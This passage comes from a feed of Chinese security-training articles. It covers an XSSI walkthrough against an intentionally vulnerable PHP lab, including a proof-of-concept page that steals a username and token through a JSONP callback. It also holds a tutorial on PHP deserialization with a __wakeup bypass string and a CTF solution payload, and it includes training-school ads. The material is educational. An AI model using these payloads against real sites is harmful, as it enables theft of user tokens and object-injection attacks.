build&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1041&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1041&quot; data-original=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1041&quot; data-rawheight=&quot;238&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1041&quot; data-original=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-86aea0e128cfbe5a2b32a02a20dbd90a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后开启容器&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;访问 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A3000/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:3000&lt;/a&gt; 即可&lt;/p&gt;&lt;p&gt;&lt;b&gt;列表&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 RCE&lt;/li&gt;&lt;li&gt;XSSI&lt;/li&gt;&lt;li&gt;PHAR 反序列化&lt;/li&gt;&lt;li&gt;PHP 对象注入&lt;/li&gt;&lt;li&gt;通过 Cookie 的 PHP 对象注入&lt;/li&gt;&lt;li&gt;PHP对象注入（对象参考）&lt;/li&gt;&lt;li&gt;通过 Cookie 的 PHP 对象注入&lt;/li&gt;&lt;li&gt;SSRF&lt;/li&gt;&lt;li&gt;变量变量&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;在测试 PHAR 反序列化之前，您需要在 php.ini 设置中将 phar.readonly = On 更改为 phar.readonly = Off &lt;/blockquote&gt;&lt;h2&gt;TEST-XSSI&lt;/h2&gt;&lt;p&gt;&lt;b&gt;什么是XSSI：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/8028511/what-is-cross-site-script-inclusion-xssi&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;stackoverflow.com/quest&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ions/8028511/what-is-cross-site-script-inclusion-xssi&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;浏览器已实现了 SOP 等安全功能，可防止从一个来源加载的文档或脚本如何与另一个来源的资源进行交互。它有助于隔离潜在的恶意文档，从而减少可能的攻击媒介。&lt;/p&gt;&lt;p&gt;例如，站点 A 实现的 example.js 和站点 B 希望从站点 A 读取 example.js。这将被 SOP 阻止。但是，如果站点 A 使用 JSONP，则站点 B 可以读取该 js 文件。&lt;/p&gt;&lt;p&gt;&lt;b&gt;题解&lt;/b&gt;&lt;/p&gt;&lt;p&gt;进入题目&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;976&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;976&quot; data-original=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;976&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;976&quot; data-original=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-aee84229c6c1aef2f0c43d296ed5868f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;提示提交用户名 admin，密码 password&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;963&quot; data-rawheight=&quot;442&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;963&quot; data-original=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;963&quot; data-rawheight=&quot;442&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;963&quot; data-original=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-b92cf6a19c11576c48dc5e9fa946067e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;目标是窃取用户和 Token&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;196&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;949&quot; data-original=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;196&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;949&quot; data-original=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f72412fb0c7a8eaeb07ed6759afb8ab2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;尝试登录后，进入一个个人信息页面&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;974&quot; data-rawheight=&quot;286&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;974&quot; data-original=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;974&quot; data-rawheight=&quot;286&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;974&quot; data-original=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-c409f811e33d4c521429e47dc73d0a28_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;查看 js，观察到用户名和 token 是使用 ajax 检索的&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;973&quot; data-rawheight=&quot;378&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;973&quot; data-original=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;973&quot; data-rawheight=&quot;378&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;973&quot; data-original=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-276feffba869988444866c20413aadd7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;创建一个 api 接口获取信息&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1114&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1114&quot; data-original=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1114&quot; data-rawheight=&quot;480&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1114&quot; data-original=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d6868ed64c53f7c2ebc8fb0db9a4ab99_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;窃取用户和 token 的POC&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;XSSI&amp;lt;/title&amp;gt;    
  &amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;script&amp;gt;
        function a(s)
        {
        alert(JSON.stringify(s));
        }
    &amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;#34;http://localhost:8081/LKWA/api/user?callback=a&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;php -S localhost:9000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;871&quot; data-rawheight=&quot;97&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;871&quot; data-original=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;871&quot; data-rawheight=&quot;97&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;871&quot; data-original=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-914857337cf49d491dbaf8b638c95de9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;浏览网址之后。就可以获取用户名和 token&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;268&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;469&quot; data-original=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;469&quot; data-rawheight=&quot;268&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;469&quot; data-original=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-57e7d932452fbd1a77d2e3422d1f168f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-13-102536299</guid>
<pubDate>Mon, 13 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>理解PHP反序列化漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-10-102166928.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102166928&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;很多小白可能都会有这样的疑惑，PHP 我知道，序列化我也知道，合在一起的 PHP 反序列化就搞不懂了。&lt;/p&gt;&lt;p&gt;今天就来破解 PHP 反序列化漏洞之谜。&lt;/p&gt;&lt;h2&gt;PHP序列化与反序列化&lt;/h2&gt;&lt;p&gt;首先，我们来理解，PHP 序列化与 PHP 反序列化这两个名词。&lt;/p&gt;&lt;blockquote&gt;序列化，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;serialize()&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;函数用于序列化对象或数组，并返回一个字符串。&lt;/blockquote&gt;&lt;p&gt;简单来说，序列化就是把一水果整齐的放在果盘里，比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
$serialized_data = serialize($sites);
echo  $serialized_data;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;a:3:{i:0;s:1:&amp;#34;a&amp;#34;;i:1;s:2:&amp;#34;bb&amp;#34;;i:2;s:3:&amp;#34;ccc&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;o表示对象，a表示数组，s表示字符，i表示数字&lt;/blockquote&gt;&lt;p&gt;意思就是往果盘里面放了一个苹果、两个香蕉、三个梨，总共 3 类。&lt;/p&gt;&lt;p&gt;放入对象也是类似的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class name1 {
    var $test1;
    var $test2;
}
$test3 = new name1;
$test3-&amp;gt;test1 = &amp;#39;hi&amp;#39;;
$test3-&amp;gt;test2 = &amp;#39;fun&amp;#39;;
echo serialize($test3); &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:5:&amp;#34;name1&amp;#34;:2:{s:5:&amp;#34;test1&amp;#34;;s:2:&amp;#34;hi&amp;#34;;s:5:&amp;#34;test2&amp;#34;;s:3:&amp;#34;fun&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;unserialize()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;单词前面加个“un”，大家都不陌生吧，就是跟前面相反的意思，把水果从果盘里面拿出来。&lt;/p&gt;&lt;p&gt;比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
$serialized_data = serialize($sites);
$unserialized_data = unserialize($serialized_data);
print_r($unserialized_data);
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Array
(
    [0] =&amp;gt;  a
    [1] =&amp;gt;  bb
    [2] =&amp;gt;  ccc
)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就是 PHP 的反序列化，返回原始的结构。&lt;/p&gt;&lt;h2&gt;反序列化漏洞&lt;/h2&gt;&lt;p&gt;不就是放水果、拿水果吗？有什么危险的。&lt;/p&gt;&lt;p&gt;下面来介绍几种“果虫”，也就是危险的 PHP 魔法函数。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;construct():当一个类被创建时自动调用
destruct():当一个类被销毁时自动调用
invoke():当把一个类当作函数使用时自动调用
tostring():当把一个类当作字符串使用时自动调用
wakeup():当调用unserialize()函数时自动调用
sleep():当调用serialize()函数时自动调用
__call():当要调用的方法不存在或权限不足时自动调用&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;来看看是怎样祸害我们的水果的：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class chybeta{
	var $test = &amp;#39;123&amp;#39;;
	function __wakeup(){
		echo &amp;#34;__wakeup&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
	function __construct(){
		echo &amp;#34;__construct&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
	function __destruct(){
		echo &amp;#34;__destruct&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
}
$class2 = &amp;#39;O:7:&amp;#34;chybeta&amp;#34;:1:{s:4:&amp;#34;test&amp;#34;;s:3:&amp;#34;123&amp;#34;;}&amp;#39;;
	print_r($class2);
echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
$class2_unser = unserialize($class2);
print_r($class2_unser);
echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;unserialize() 反序列化之后，会导致 wakeup() 或 destruct() 的直接调用，因此最理想的情况就是一些漏洞/危害代码在 wakeup() 或 destruct() 中，从而当我们控制序列化字符串时可以去直接触发它们。&lt;/p&gt;&lt;p&gt;&lt;b&gt;绕过魔法函数&lt;/b&gt;&lt;/p&gt;&lt;p&gt;魔法函数 sleep() 和 wakeup()&lt;/p&gt;&lt;blockquote&gt;php 文档中定义 __wakeup():&lt;br/&gt;unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep() 则相反，是用在序列化一个对象时被调用.&lt;/blockquote&gt;&lt;p&gt;正常情况下的反序列化漏洞如下图：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;析构方法和 __wakeup 都能够执行&lt;/p&gt;&lt;p&gt;如果我们把传入的序列化字符串的属性个数更改成大于 1 的任何数&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:7:&amp;#34;hpdoger&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:6:&amp;#34;u know&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图，__wakeup 没有被执行，但是执行了析构函数&lt;/p&gt;&lt;h2&gt;CTF题实战&lt;/h2&gt;&lt;p&gt;&lt;b&gt;南邮CTF&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class just4fun { //定义了一个类
    var $enter;
    var $secret;
}
if (isset($_GET[&amp;#39;pass&amp;#39;])) {
    $pass = $_GET[&amp;#39;pass&amp;#39;];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass); //进行反序列化处理

    if ($o) {
        $o-&amp;gt;secret = &amp;#34;*&amp;#34;; //这里不知道*代表的是啥
        if ($o-&amp;gt;secret === $o-&amp;gt;enter) //要求$o中的两个属性值相同
            echo &amp;#34;Congratulation! Here is my secret: &amp;#34;.$o-&amp;gt;secret;
        else 
            echo &amp;#34;Oh no... You can&amp;#39;t fool me&amp;#34;;
    }
    else echo &amp;#34;are you trolling?&amp;#34;;
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于我们不知道 * 代表的是什么，所以用指针来直接让两个的属性相等。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class just4fun {
    var $enter;
    var $secret;
}
$o = new just4fun;
$o-&amp;gt;enter = &amp;amp;$o-&amp;gt;secret; //这里的a=&amp;amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b
echo serialize($o);
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本地运行即可得到序列化字符串&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:8:&amp;#34;just4fun&amp;#34;:2:{s:5:&amp;#34;enter&amp;#34;;N;s:6:&amp;#34;secret&amp;#34;;R:2;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后将此作为 pass 参数 GET 发送即可获得 flag。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; 